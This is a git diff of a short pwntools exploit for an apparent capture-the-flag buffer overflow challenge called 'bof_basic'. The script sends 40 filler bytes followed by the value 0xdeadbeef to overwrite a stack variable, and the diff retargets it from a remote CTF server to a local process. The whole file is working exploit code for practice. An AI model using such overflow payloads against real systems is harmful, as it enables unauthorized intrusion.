@@ -1,12 +1,12 @@
 from pwn import *
 
-e = ELF("./bof_basic")
-#p = process("./bof_basic")
-r = remote("ctf.j0n9hyun.xyz", 3000)
+p = process("./bof_basic")
+
+sh = 0xdeadbeef
 
 payload = ''
 payload += "A"*40
-payload += p32(0xdeadbeef)
+payload += p32(sh)
 
-r.sendline(payload)
-r.interactive()
+p.sendline(payload)
+p.interactive()
